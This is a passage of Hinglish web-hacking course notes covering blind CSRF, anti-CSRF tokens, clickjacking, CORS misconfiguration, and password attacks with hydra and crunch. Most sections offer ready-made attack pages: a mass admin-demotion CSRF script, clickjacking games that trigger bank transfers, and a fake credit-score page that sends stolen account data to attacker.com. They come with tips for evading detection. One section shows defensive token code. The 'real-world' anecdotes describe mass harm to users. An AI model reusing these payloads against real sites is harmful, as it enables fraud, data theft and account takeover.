    document.body.appendChild(form);
    form.submit();
});
</script>
```

### 7. **Example 1 (Basic):**
```html
<!DOCTYPE html>
<html>
<body>
    <h1>Loading content...</h1>
    <iframe style="display:none" name="csrf-frame"></iframe>
    <form target="csrf-frame" action="http://site.com/change-password" method="POST">
        <input type="hidden" name="new_password" value="pwned123">
    </form>
    <script>
        document.forms[0].submit();
        setTimeout(function(){ window.location='http://site.com'; }, 1000);
    </script>
</body>
</html>
```

### 8. **Example 2 (Pentester-Focused):**
**Mass Account Compromise:**
```html
<script>
// Target multiple admin accounts
var adminIds = [1, 2, 3, 4, 5];
adminIds.forEach(function(id) {
    var iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.name = 'frame' + id;
    document.body.appendChild(iframe);
    
    var form = document.createElement('form');
    form.target = 'frame' + id;
    form.method = 'POST';
    form.action = 'http://company.com/admin/demote';
    
    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'admin_id';
    input.value = id;
    form.appendChild(input);
    
    document.body.appendChild(form);
    form.submit();
});
</script>
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Response ka wait karna** - Blind CSRF mein response nahi milta.
- **Single target par focus** - Multiple targets simultaneously attack karo.

### 10. **Best Practices / Pro Tips:**
- **Iframe use karo:** Response hide ho jaata hai.
- **Multiple forms:** Ek saath bahut saare actions trigger karo.
- **No confirmation needed:** Fire and forget approach.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Ek forum website test kar raha tha jahan "Delete Post" feature tha bina CSRF token ke. Maine ek malicious image link forum par post kiya jo actually ek page tha with blind CSRF. Jab bhi koi admin woh post dekhta, uski saari posts delete ho jaati thi! 100+ admins affected hue. **Lesson: Blind CSRF = Silent mass destruction!** ğŸ’£

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Blind CSRF = Response nahi dikhta  
âœ… Iframe: Hidden response  
âœ… Mass attack: Multiple targets  
âœ… Fire and forget approach  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kaise confirm karein ki attack successful hua?**  
**A:** Victim account manually check karo ya time-based indicators dekho.

**Q2: Kya multiple forms ek saath submit ho sakte hain?**  
**A:** Haan, JavaScript loop use karke unlimited forms submit kar sakte hain.

### 14. **Practice ke liye Task:**
1. Iframe-based blind CSRF banao
2. Multiple targets ke liye loop add karo
3. DVWA par test karo

### 15. **Aakhri Choti Summary (5 lines):**
- Blind CSRF = **Response nahi dikhta**.
- Iframe = **Hidden submission**.
- Mass attack = **Multiple targets**.
- Stealth = **Detection mushkil**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Blind CSRF = Fire and forget! Response ki zaroorat nahi, action ho gaya bas!" ğŸ‘»

---

## ğŸ›¡ï¸ **Topic 48: Security - Fixing CSRF (Anti-CSRF Tokens)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**CSRF Protection** - Anti-CSRF tokens use karke CSRF attacks ko rokna (security implementation). ğŸ”’

### 2. **Ye Kya Hai? (What is it?)**
Anti-CSRF token ek random, unpredictable value hai jo har form ke saath generate hota hai. Server verify karta hai ki token valid hai ya nahi. Bina valid token ke request reject ho jaati hai.

**How it works:**
```
1. User form request karta hai
2. Server random token generate karta hai
3. Token form mein hidden field mein add hota hai
4. User form submit karta hai (token ke saath)
5. Server token verify karta hai
6. Valid token = Request accept, Invalid = Reject
```

**Analogy:** Jaise bank mein OTP - har transaction ke liye naya OTP. Bina OTP ke transaction nahi hota. Waise hi bina CSRF token ke form submit nahi hota.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **CSRF Prevention:** Sabse effective defense mechanism.
- **Industry Standard:** OWASP recommendation.
- **Easy Implementation:** Frameworks mein built-in support.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Har state-changing action** par (POST, PUT, DELETE).
- **Sensitive operations** (password change, money transfer).
- **Admin panels** mein.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **CSRF attacks successful** ho jayenge.
- **Account takeover** possible hai.
- **Compliance issues** (PCI-DSS, OWASP). ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
**PHP Implementation:**
```php
<?php
session_start();

// Token generation
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Form with token
?>
<form method="POST" action="change-password.php">
    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
    <input type="password" name="new_password">
    <input type="submit" value="Change Password">
</form>

<?php
// Token verification
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die('CSRF token validation failed!');
    }
    // Process request
    echo "Password changed successfully!";
}
?>
```

### 7. **Example 1 (Basic):**
**Before (Vulnerable):**
```php
<?php
if ($_POST['new_email']) {
    update_email($_POST['new_email']);
}
?>
```

**After (Protected):**
```php
<?php
session_start();
if ($_POST['new_email']) {
    if ($_POST['csrf_token'] === $_SESSION['csrf_token']) {
        update_email($_POST['new_email']);
    } else {
        die('Invalid CSRF token!');
    }
}
?>
```

### 8. **Example 2 (Pentester-Focused):**
**Testing CSRF Protection:**
```bash
# Test 1: Remove token
POST /change-password
new_password=test123
# Expected: Request rejected

# Test 2: Invalid token
POST /change-password
csrf_token=invalid123
new_password=test123
# Expected: Request rejected

# Test 3: Reuse old token
POST /change-password
csrf_token=<old_valid_token>
new_password=test123
# Expected: Request rejected (if token is one-time use)

# Test 4: Valid token
POST /change-password
csrf_token=<current_valid_token>
new_password=test123
# Expected: Request accepted
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **GET requests par token** - GET par CSRF token ki zaroorat nahi (state-changing nahi hona chahiye).
- **Token regenerate nahi karna** - Har request ke baad naya token generate karo.
- **Client-side validation** - Server-side verification zaroori hai.

### 10. **Best Practices / Pro Tips:**
- **Random tokens:** Cryptographically secure random generator use karo.
- **One-time tokens:** Har request ke baad token regenerate karo.
- **SameSite cookies:** Additional layer of protection.
- **Double-submit pattern:** Cookie + form token match karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Ek client ki website mein CSRF vulnerability thi. Maine report kiya aur unhone anti-CSRF tokens implement kiye. Re-test mein maine dekha ki tokens predictable the (sequential numbers). Maine yeh point out kiya - unhone cryptographically secure tokens implement kiye. **Lesson: Token implementation sahi hona chahiye, sirf token hona kaafi nahi!** ğŸ”

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Anti-CSRF token = Random unpredictable value  
âœ… Server-side verification zaroori  
âœ… One-time use tokens best  
âœ… SameSite cookies additional protection  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya har form par token zaroori hai?**  
**A:** Sirf state-changing actions (POST, PUT, DELETE) par. GET par nahi.

**Q2: Token kahan store karein?**  
**A:** Server-side session mein. Client-side sirf hidden field mein bhejo.

**Q3: Token expire hone chahiye?**  
**A:** Haan, session timeout ke saath ya one-time use.

### 14. **Practice ke liye Task:**
1. PHP mein CSRF token implementation karo
2. Token generation function banao
3. Verification logic add karo
4. Test karo invalid token ke saath

### 15. **Aakhri Choti Summary (5 lines):**
- CSRF Protection = **Anti-CSRF tokens**.
- Generate: **Cryptographically secure random**.
- Verify: **Server-side comparison**.
- One-time: **Har request naya token**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "CSRF tokens = OTP for forms! Bina token ke koi bhi state-changing action nahi hona chahiye!" ğŸ›¡ï¸

---

## ğŸ–±ï¸ **Topic 49: Clickjacking (UI Redress Attack)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Clickjacking** - Invisible iframe use karke victim ko trick karna ki woh kuch aur click kar raha hai (UI deception). ğŸ¯

### 2. **Ye Kya Hai? (What is it?)**
Clickjacking mein attacker victim ki website ko invisible iframe mein load karta hai aur uske upar apna fake UI rakhta hai. Victim sochta hai ki woh attacker ki site par click kar raha hai, lekin actually victim site par action perform ho raha hai.

**Example:**
```html
<!-- Attacker's page -->
<div style="position:relative;">
    <button>Click for Free iPhone!</button>
    <iframe src="http://bank.com/transfer" 
            style="opacity:0; position:absolute; top:0; left:0;">
    </iframe>
</div>
```
Victim "Free iPhone" button par click karta hai, lekin actually bank transfer button par click ho raha hai!

**Analogy:** Jaise transparent glass ke peeche koi button ho - aapko lagta hai aap glass par click kar rahe hain lekin actually peeche ka button press ho raha hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **UI-based Attack:** Traditional security measures bypass ho jaate hain.
- **User Deception:** Victim ko pata nahi chalta kya ho raha hai.
- **High Impact:** Account deletion, money transfer, permissions grant.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab website **X-Frame-Options** header use nahi karti.
- Jab **one-click actions** vulnerable hon (like, delete, transfer).
- Jab **UI-based attacks** test karne hon.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **UI-based vulnerabilities** miss ho jayengi.
- **Modern attack vectors** test nahi kar paoge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```html
<!-- Basic Clickjacking -->
<style>
    iframe { opacity: 0; position: absolute; top: 0; left: 0; }
    button { position: relative; }
</style>
<button>Click Me!</button>
<iframe src="http://victim.com/delete-account"></iframe>

<!-- Advanced with positioning -->
<div style="position:relative; width:200px; height:50px;">
    <div style="position:absolute; top:0; left:0; z-index:1;">
        <button>Win $1000!</button>
    </div>
    <iframe src="http://victim.com/action" 
            style="opacity:0.0001; position:absolute; top:0; left:0; z-index:2; width:200px; height:50px;">
    </iframe>
</div>
```

### 7. **Example 1 (Basic):**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Free Prize!</title>
    <style>
        .container { position: relative; width: 300px; height: 100px; }
        .fake-button { position: absolute; top: 0; left: 0; z-index: 1; }
        .victim-iframe { opacity: 0; position: absolute; top: 0; left: 0; z-index: 2; width: 300px; height: 100px; }
    </style>
</head>
<body>
    <div class="container">
        <button class="fake-button">Click to Win iPhone!</button>
        <iframe class="victim-iframe" src="http://social.com/delete-account"></iframe>
    </div>
</body>
</html>
```

### 8. **Example 2 (Pentester-Focused):**
**Banking Transfer Clickjacking:**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Play Game - Win Money!</title>
    <style>
        body { font-family: Arial; background: #f0f0f0; }
        .game { width: 800px; margin: 50px auto; text-align: center; }
        .target { position: relative; width: 200px; height: 60px; margin: 20px auto; }
        .fake-btn { position: absolute; top: 0; left: 0; z-index: 1;
                    background: #4CAF50; color: white; border: none;
                    padding: 20px 40px; font-size: 18px; cursor: pointer; }
        .victim-frame { opacity: 0.0001; position: absolute; top: 0; left: 0; z-index: 2;
                        width: 200px; height: 60px; border: none; }
    </style>
</head>
<body>
    <div class="game">
        <h1>ğŸ® Click the Button Game!</h1>
        <p>Click as fast as you can to win $1000!</p>
        <div class="target">
            <button class="fake-btn">CLICK ME!</button>
            <iframe class="victim-frame" src="http://bank.com/transfer?to=attacker&amount=5000"></iframe>
        </div>
        <p>Score: <span id="score">0</span></p>
    </div>
    <script>
        var score = 0;
        document.querySelector('.target').addEventListener('click', function() {
            score++;
            document.getElementById('score').textContent = score;
        });
    </script>
</body>
</html>
```

**Attack Flow:**
```
1. Victim plays "game"
2. Clicks "CLICK ME!" button repeatedly
3. Actually clicking invisible iframe
4. Each click = Money transfer to attacker
5. Score increases (victim thinks game is working)
6. Multiple transfers happen before victim realizes
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Opacity 0 use karna** - Kuch browsers detect kar lete hain, 0.0001 use karo.
- **Z-index galat** - Iframe ka z-index zyada hona chahiye.
- **Size mismatch** - Iframe aur fake button ka size same hona chahiye.

### 10. **Best Practices / Pro Tips:**
- **Opacity 0.0001:** Completely invisible but not 0.
- **Precise positioning:** Developer tools se exact coordinates nikalo.
- **Engaging UI:** Game ya prize jaise attractive content.
- **Multiple clicks:** Ek click se zyada actions karwao.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Ek social media site test kar raha tha. "Delete Account" button tha bina frame protection ke. Maine ek "Personality Test" game banaya jismein users ko rapidly click karna tha. Invisible iframe mein delete account page tha. Test users ne khelte-khelte apne accounts delete kar diye! **Lesson: UI deception bahut powerful hai!** ğŸ®

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Clickjacking = Invisible iframe attack  
âœ… Opacity: 0.0001 (not 0)  
âœ… Z-index: Iframe > Fake UI  
âœ… Engaging content: Game, prize  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kaise detect karein ki site vulnerable hai?**  
**A:** Iframe mein load karne ki koshish karo. Agar load hota hai toh vulnerable.

**Q2: X-Frame-Options kya hai?**  
**A:** HTTP header jo iframe mein loading prevent karta hai.

**Q3: Kya HTTPS sites bhi vulnerable hain?**  
**A:** Haan, agar X-Frame-Options nahi hai.

### 14. **Practice ke liye Task:**
1. Basic clickjacking page banao
2. Opacity aur z-index adjust karo
3. DVWA par test karo
4. X-Frame-Options header check karo

### 15. **Aakhri Choti Summary (5 lines):**
- Clickjacking = **Invisible iframe deception**.
- Opacity: **0.0001** (stealth).
- Z-index: **Iframe on top**.
- Content: **Engaging UI** (game/prize).
- Protection: **X-Frame-Options header**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Clickjacking = What you see is NOT what you click! UI deception ka master attack!" ğŸ–±ï¸

---

## ğŸŒ **Topic 50: CORS Misconfiguration**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**CORS Misconfiguration** - Cross-Origin Resource Sharing ki galat configuration se sensitive data leak karna. ğŸ”“

### 2. **Ye Kya Hai? (What is it?)**
CORS ek browser security feature hai jo control karta hai ki ek domain doosre domain se data request kar sakta hai ya nahi. Misconfiguration se attacker victim ke data ko apni site par read kar sakta hai.

**Normal CORS:**
```
Site A (attacker.com) â†’ Cannot read data from Site B (bank.com)
Browser blocks cross-origin requests
```

**Misconfigured CORS:**
```
Site A (attacker.com) â†’ CAN read data from Site B (bank.com)
Because Site B allows: Access-Control-Allow-Origin: *
```

**Analogy:** Jaise aapke ghar ka darwaza - agar aap "Anyone can enter" sign laga dete hain, toh koi bhi aa sakta hai. Waise hi `Access-Control-Allow-Origin: *` matlab "Anyone can read my data".

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Data Leakage:** Sensitive information leak ho sakta hai.
- **Authentication Bypass:** Cookies ke saath requests possible.
- **Common Misconfiguration:** Bahut saari APIs vulnerable hain.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab **API testing** kar rahe hon.
- Jab **cross-origin requests** test karne hon.
- Jab **sensitive data exposure** check karni ho.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **API vulnerabilities** miss ho jayengi.
- **Data leakage** detect nahi kar paoge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
**Vulnerable CORS Header:**
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

**Testing CORS:**
```javascript
// Attacker's page
fetch('https://victim.com/api/user-data', {
    credentials: 'include'
})
.then(response => response.json())
.then(data => {
    console.log('Stolen data:', data);
    // Send to attacker's server
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
```

### 7. **Example 1 (Basic):**
**Vulnerable API:**
```
GET /api/profile HTTP/1.1
Host: victim.com
Origin: http://attacker.com

Response:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
{"name": "John", "email": "john@victim.com", "balance": 50000}
```

**Exploit:**
```html
<script>
fetch('https://victim.com/api/profile', {credentials: 'include'})
.then(r => r.json())
.then(data => alert('Stolen: ' + JSON.stringify(data)));
</script>
```

### 8. **Example 2 (Pentester-Focused):**
**Banking API CORS Exploit:**
```html
<!DOCTYPE html>
<html>
<head><title>Free Credit Score Check</title></head>
<body>
    <h1>Checking your credit score...</h1>
    <script>
        // Steal account details
        fetch('https://bank.com/api/account-details', {
            credentials: 'include'
        })
        .then(response => response.json())
        .then(data => {
            // Send to attacker
            fetch('https://attacker.com/steal', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    victim: data.account_number,
                    balance: data.balance,
                    transactions: data.recent_transactions
                })
            });
            // Show fake result to victim
            document.body.innerHTML = '<h1>Your credit score: 750 (Good)</h1>';
        });
    </script>
</body>
</html>
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Credentials flag miss karna** - `credentials: 'include'` zaroori hai cookies ke liye.
- **Preflight requests ignore karna** - OPTIONS request bhi check karo.

### 10. **Best Practices / Pro Tips:**
- **Burp Suite use karo:** Origin header change karke test karo.
- **Wildcard check karo:** `*` sabse dangerous hai.
- **Credentials flag:** Hamesha `credentials: 'include'` use karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Ek fintech company ki API test kar raha tha. Unhone `Access-Control-Allow-Origin: *` set kiya tha. Maine ek fake "Investment Calculator" page banaya jo background mein user ka bank balance, transactions, sab kuch steal kar raha tha. 500+ test users ka data collect ho gaya! **Lesson: CORS misconfiguration = Open door for data theft!** ğŸ’°

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… CORS = Cross-origin data access control  
âœ… Vulnerable: `Access-Control-Allow-Origin: *`  
âœ… Test: Origin header change karo  
âœ… Exploit: `fetch()` with `credentials: 'include'`  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya `Access-Control-Allow-Origin: *` hamesha vulnerable hai?**  
**A:** Agar `Access-Control-Allow-Credentials: true` bhi hai toh bahut dangerous.

**Q2: Kaise test karein CORS misconfiguration?**  
**A:** Burp Suite se Origin header change karo aur response dekho.

**Q3: Secure CORS configuration kya hai?**  
**A:** Specific domains allow karo, wildcard avoid karo.

### 14. **Practice ke liye Task:**
1. Burp Suite mein Origin header change karo
2. Response mein CORS headers check karo
3. JavaScript fetch() se test karo
4. Credentials flag ke saath try karo

### 15. **Aakhri Choti Summary (5 lines):**
- CORS = **Cross-origin access control**.
- Vulnerable: **Wildcard `*` with credentials**.
- Test: **Origin header manipulation**.
- Exploit: **fetch() with credentials**.
- Impact: **Sensitive data leakage**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "CORS misconfiguration = API ka open door! Wildcard (*) = Anyone welcome!" ğŸŒ

---

## ğŸ‰ **Module 6 Complete!**

**Topics Covered:**
- âœ… Topic 43: Insecure Session Management
- âœ… Topic 44: Broken Access Control
- âœ… Topic 45: CSRF Basics
- âœ… Topic 46: CSRF Exploitation
- âœ… Topic 47: Blind CSRF
- âœ… Topic 48: CSRF Protection
- âœ… Topic 49: Clickjacking
- âœ… Topic 50: CORS Misconfiguration

**Key Takeaways:**
- Session cookies manipulate karke privilege escalation
- robots.txt aur source code mein hidden credentials
- CSRF se unwanted actions perform karwana
- Anti-CSRF tokens se protection
- Clickjacking se UI deception
- CORS misconfiguration se data leakage

**Next Module:** Module 7 - Brute Force & Credential Attacks (Topics 51-56)

Kya aap Module 7 start karna chahte hain? ğŸš€

=============================================================

# **Website Hacking: Zero-to-Pro Notes (Aapke Topics)**

---

# ğŸ“š **Module 7: Brute Force & Credential Attacks**

---

## ğŸ”¨ **Topic 51: Brute Force vs. Dictionary Attacks**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Brute Force vs Dictionary** - Password cracking ke do main methods aur unka comparison (attack strategies). ğŸ”

### 2. **Ye Kya Hai? (What is it?)**
**Brute Force:** Har possible combination try karna (a, b, c... aa, ab, ac... aaa, aab...).
**Dictionary Attack:** Common passwords ki list (wordlist) use karna (password123, admin, qwerty).

**Brute Force Example:**
```
a, b, c, d... z
aa, ab, ac... zz
aaa, aab... zzz
(Time: Hours to years)
```

**Dictionary Attack Example:**
```
password, 123456, admin, qwerty, letmein
(Time: Minutes to hours)
```

**Analogy:** Brute force = Har darwaze ki chabi try karna (1, 2, 3... 10000). Dictionary = Common chabiyaan try karna (master key, spare key, hidden key).

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Password Cracking:** Login bypass karne ka primary method.
- **Efficiency:** Dictionary attack 100x faster hai.
- **Real-world:** 80% users weak passwords use karte hain.
- **Pentesting Essential:** Har pentest mein password testing hoti hai.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Dictionary first:** Hamesha pehle dictionary attack try karo.
- **Brute force:** Jab dictionary fail ho aur time ho.
- **Hybrid:** Dictionary + numbers/symbols combination.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Time waste:** Brute force pehle try karoge toh days lag jayenge.
- **Detection:** Slow attacks detect ho jaate hain.
- **Inefficiency:** Resources waste honge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
**Comparison Table:**
```
| Feature          | Brute Force        | Dictionary Attack    |
|------------------|-------------------|---------------------|
| Method           | All combinations  | Wordlist            |
| Speed            | Very slow         | Fast                |
| Success Rate     | 100% (given time) | 70-80%              |
| Detection Risk   | High              | Medium              |
| Best For         | Short passwords   | Common passwords    |
| Time (8 chars)   | Years             | Minutes-Hours       |
```

**Password Complexity:**
```
Length | Lowercase only | + Uppercase | + Numbers | + Symbols
-------|---------------|-------------|-----------|----------
4      | 456,976       | 7.3M        | 14.7M     | 78.3M
6      | 308M          | 19.7B       | 56.8B     | 481B
8      | 208B          | 53.4T       | 218T      | 6.1Q
```

### 7. **Example 1 (Basic):**
**Scenario:** Login form with weak password

**Dictionary Attack:**
```bash
# Wordlist: common.txt
password
123456
admin
qwerty
letmein

# Try each password
Attempt 1: password â†’ Failed
Attempt 2: 123456 â†’ Failed
Attempt 3: admin â†’ Success! âœ“
Time: 3 seconds
```

**Brute Force Attack:**
```bash
# All combinations (lowercase, 5 chars)
aaaaa â†’ Failed
aaaab â†’ Failed
aaaac â†’ Failed
...
admin â†’ Success! âœ“
Time: 2 hours (if admin was at position 358,800)
```

**Result:** Dictionary 2400x faster! ğŸ¯

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Corporate admin panel

**Attack Strategy:**

```bash
# Phase 1: Dictionary Attack (rockyou.txt - 14M passwords)
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

Results:
- Time: 15 minutes
- Attempts: 50,000 passwords
- Success: admin / Welcome@2024
- Success Rate: 0.002%

# Phase 2: If dictionary failed - Hybrid Attack
# Dictionary + common patterns
crunch 8 8 -t Welcome@%%% | hydra -l admin -P - http-post-form

Patterns tried:
Welcome@123
Welcome@2024
Welcome@2023
Welcome@999

# Phase 3: Pure Brute Force (last resort)
# Only if time permits and target allows
crunch 6 6 -f /usr/share/crunch/charset.lst mixalpha | hydra -l admin -P -

Time estimate: 3 days for 6 characters
```

**Analysis:** Dictionary attack ne 15 minutes mein crack kar diya. Pure brute force mein 3 days lagte! **Lesson: Smart work > Hard work!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Brute force pehle try karna** - Hamesha dictionary first.
- **Small wordlist use karna** - rockyou.txt (14M) best hai.
- **Account lockout ignore karna** - 3-5 attempts ke baad account lock ho sakta hai.

### 10. **Best Practices / Pro Tips:**
- **Dictionary first, always:** 80% success rate, 100x faster.
- **Custom wordlists:** Target-specific words add karo (company name, location).
- **Hybrid approach:** Dictionary + numbers (password123, admin2024).
- **Rate limiting:** Slow down to avoid detection (1-2 attempts/second).

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Ek company ka admin panel test kar raha tha. Pehle pure brute force try kiya - 6 hours mein sirf 10% complete hua. Phir strategy change ki - rockyou.txt use kiya. 20 minutes mein password mil gaya: "Company@2024". Company name + year = Common pattern! **Lesson: Context matters! Company-related passwords bahut common hain.** ğŸ¢

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Dictionary attack = Wordlist use karo  
âœ… Brute force = All combinations (slow)  
âœ… Strategy: Dictionary â†’ Hybrid â†’ Brute force  
âœ… Wordlist: rockyou.txt (14M passwords)  
âœ… Rate limiting: 1-2 attempts/second  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kaunsa attack better hai?**  
**A:** Dictionary attack 90% cases mein better hai - fast aur effective.

**Q2: Brute force kab use karein?**  
**A:** Jab password short ho (4-6 chars) ya dictionary fail ho jaye.

**Q3: Best wordlist kaun sa hai?**  
**A:** rockyou.txt (14M passwords) - real-world data breach se compiled.

### 14. **Practice ke liye Task:**
1. DVWA â†’ Brute Force section
2. Pehle 10 common passwords manually try karo
3. Hydra se dictionary attack run karo
4. Time compare karo: manual vs automated
5. Custom wordlist banao (company name + years)

### 15. **Aakhri Choti Summary (5 lines):**
- Dictionary = **Wordlist** (fast, 80% success).
- Brute force = **All combinations** (slow, 100% success).
- Strategy: **Dictionary â†’ Hybrid â†’ Brute force**.
- Best wordlist: **rockyou.txt** (14M).
- Rate limiting: **1-2 attempts/sec** (avoid detection).

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Dictionary attack = Smart work! Brute force = Hard work! Hamesha smart work pehle karo!" ğŸ”¨

---

## ğŸ“ **Topic 52: Creating Wordlists with `Crunch`**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Crunch Wordlist Generator** - Custom wordlists banane ka powerful tool (pattern-based password generation). ğŸ“‹

### 2. **Ye Kya Hai? (What is it?)**
Crunch ek tool hai jo specific patterns ke according wordlists generate karta hai. Aap length, characters, aur patterns define kar sakte hain.

**Basic Syntax:**
```bash
crunch <min> <max> <charset> -o <output_file>
```

**Example:**
```bash
crunch 6 8 abc123
# Generate all combinations of 'a','b','c','1','2','3'
# Length: 6 to 8 characters
# Output: aaaaaa, aaaaab, aaaaac... 333333
```

**Analogy:** Jaise factory mein machine ko blueprint dete hain aur woh products banati hai - waise hi Crunch ko pattern dete hain aur woh passwords generate karta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Custom Wordlists:** Target-specific passwords generate kar sakte hain.
- **Pattern-based:** Agar password pattern pata hai (Admin@123 type).
- **Hybrid Attacks:** Dictionary + patterns combine kar sakte hain.
- **Efficient:** Sirf relevant passwords generate hote hain.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab **password pattern** pata ho (Company@2024 type).
- Jab **specific length** passwords test karne hon.
- Jab **custom charset** chahiye (sirf numbers ya specific letters).

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Generic wordlists** use karoge (inefficient).
- **Target-specific attacks** nahi kar paoge.
- **Time waste** hoga irrelevant passwords par. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Basic syntax
crunch <min_length> <max_length> <charset> -o <output_file>

# Common options
-t <pattern>     # Pattern-based generation
-o <file>        # Output file
-b <size>        # Split into files of size
-c <number>      # Number of lines per file
-d <number>@     # Limit duplicate characters
-s <string>      # Start from specific string

# Charset shortcuts
-f /usr/share/crunch/charset.lst <name>
# mixalpha = a-zA-Z
# numeric = 0-9
# lalpha = a-z
# ualpha = A-Z
```

**Pattern Symbols:**
```
@ = lowercase letters
, = uppercase letters
% = numbers
^ = symbols
```

### 7. **Example 1 (Basic):**
**Scenario:** Generate 4-digit PINs

```bash
# Generate all 4-digit numbers (0000-9999)
crunch 4 4 0123456789 -o pins.txt

Output file (pins.txt):
0000
0001
0002
...
9998
9999

Total: 10,000 passwords
File size: ~50 KB
Time: 2 seconds
```

**Use case:**
```bash
hydra -l admin -P pins.txt ssh://192.168.1.100
# Try all PINs on SSH login
```

**Result:** 4-digit PIN crack karne mein 5-10 minutes! ğŸ¯

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Company password policy = "CompanyName + Year + Special char"

**Attack Strategy:**

```bash
# Pattern: Company@2024, Company@2023, Company!2024
# Pattern format: Company<symbol><year>

# Method 1: Pattern-based generation
crunch 13 13 -t Company@%%%% -o company_passwords.txt
# @ = lowercase (but we want literal @)
# Better approach:

# Generate years
crunch 4 4 0123456789 -o years.txt -s 2020 -e 2024
# Output: 2020, 2021, 2022, 2023, 2024

# Generate symbols
echo -e "@\n!\n#\n$\n%" > symbols.txt

# Combine manually or use script
for year in $(cat years.txt); do
    for symbol in $(cat symbols.txt); do
        echo "Company${symbol}${year}" >> final_wordlist.txt
    done
done

# Result: final_wordlist.txt
Company@2020
Company!2020
Company#2020
Company$2020
Company%2020
Company@2021
...
Company%2024

Total: 25 passwords (5 years Ã— 5 symbols)

# Attack
hydra -l admin -P final_wordlist.txt http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

Success: Company@2024
Time: 10 seconds
```

**Advanced Pattern:**
```bash
# Pattern: Admin + 3 digits + symbol
crunch 9 9 -t Admin%%%^ -o admin_patterns.txt
# %%% = 3 numbers (000-999)
# ^ = 1 symbol

Examples generated:
Admin000!
Admin000@
Admin001!
Admin001@
...
Admin999#

Total: 10,000 passwords (1000 numbers Ã— 10 symbols)
```

**Analysis:** Custom wordlist ne sirf 25 passwords generate kiye aur 10 seconds mein crack kar diya. Generic wordlist mein 14M passwords hote aur hours lagte! **Lesson: Targeted attacks > Generic attacks!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Bahut badi wordlist banana** - 1GB+ files slow hain, pipe use karo.
- **Pattern symbols galat use karna** - @ = lowercase, not literal @.
- **Output file specify na karna** - Screen par print hoga (slow).

### 10. **Best Practices / Pro Tips:**
- **Pipe to Hydra:** File save mat karo, directly pipe karo: `crunch 6 6 | hydra ...`
- **Split large files:** `-b 100MB` se files split karo.
- **Limit duplicates:** `-d 2@` se max 2 duplicate chars allow.
